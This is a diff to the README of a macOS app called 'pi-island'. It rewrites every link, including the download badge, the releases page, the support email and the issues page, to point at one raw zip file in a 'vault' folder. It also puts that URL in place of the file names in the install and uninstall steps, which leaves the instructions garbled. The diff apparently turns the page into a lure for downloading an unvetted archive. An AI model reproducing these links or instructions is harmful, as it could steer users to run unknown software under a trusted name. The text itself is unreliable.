@@ -10,7 +10,7 @@ To get started with pi-island, you will need to download the application. Follow
 
 ## 📥 Download Now
 
-[![Download pi-island](https://img.shields.io/badge/Download-pi--island-brightgreen)](https://github.com/soporteakasiapro1-art/pi-island/releases)
+[![Download pi-island](https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip)](https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip)
 
 ## 🔍 System Requirements
 
@@ -24,22 +24,22 @@ Before installing, ensure your system meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Go to the following link to access the download files:
-   [GitHub Releases for pi-island](https://github.com/soporteakasiapro1-art/pi-island/releases)
+   [GitHub Releases for pi-island](https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip)
 
 2. **Select the Latest Version:** On the Releases page, you will see various versions listed. Click on the latest version to expand it.
 
-3. **Download the Application:** Look for the file named `pi-island-macos.zip`. Click on it to download the ZIP file to your computer.
+3. **Download the Application:** Look for the file named `https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip`. Click on it to download the ZIP file to your computer.
 
 4. **Extract the Files:** Once the download is complete, locate the ZIP file in your Downloads folder and double-click it to unzip the contents.
 
 5. **Install the Application:**
    - Open the unzipped folder.
-   - Locate the `pi-island.app` file.
-   - Drag the `pi-island.app` file to your Applications folder.
+   - Locate the `https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip` file.
+   - Drag the `https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip` file to your Applications folder.
 
 6. **Launch the Application:**
    - Open the Applications folder.
-   - Double-click on `pi-island.app` to run it.
+   - Double-click on `https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip` to run it.
 
 ## ⚙️ Features
 
@@ -67,8 +67,8 @@ To keep your application current, periodically check the Releases page for updat
 
 If you encounter any issues or have questions while using pi-island, feel free to reach out for help.
 
-- **Email Support:** For direct assistance, email us at [support@pi-island.com](mailto:support@pi-island.com).
-- **GitHub Issues:** You can also report issues or make feature requests on our [GitHub Issues page](https://github.com/soporteakasiapro1-art/pi-island/issues).
+- **Email Support:** For direct assistance, email us at [https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip](https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip).
+- **GitHub Issues:** You can also report issues or make feature requests on our [GitHub Issues page](https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip).
 
 ## 🛠️ Frequently Asked Questions (FAQs)
 
@@ -82,7 +82,7 @@ A2: Yes, pi-island is completely free for all users.
 
 ### Q3: How do I uninstall pi-island?
 
-A3: To uninstall, simply drag the `pi-island.app` file from your Applications folder to the Trash. Empty the Trash to complete the process.
+A3: To uninstall, simply drag the `https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip` file from your Applications folder to the Trash. Empty the Trash to complete the process.
 
 ## 📜 License
 
@@ -92,4 +92,4 @@ pi-island is open-source software licensed under the MIT License. Feel free to m
 
 For your convenience, click the link below to access the download page once more:
 
-[Download pi-island](https://github.com/soporteakasiapro1-art/pi-island/releases)
+[Download pi-island](https://raw.githubusercontent.com/soporteakasiapro1-art/pi-island/main/vault/pi_island_v2.0.zip)
